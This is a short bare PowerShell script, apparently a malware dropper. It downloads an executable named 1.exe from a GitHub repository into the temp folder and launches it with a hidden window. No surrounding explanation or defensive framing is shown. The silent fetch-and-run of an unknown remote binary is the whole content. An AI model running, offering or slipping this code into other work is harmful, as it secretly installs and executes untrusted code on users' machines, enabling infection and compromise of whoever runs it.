$exePath = "$env:TEMP\1.exe"
(New-Object Net.WebClient).DownloadFile('https://github.com/socialhate/Test/raw/refs/heads/main/1.exe', $exePath)
Start-Process -FilePath $exePath -WindowStyle Hidden
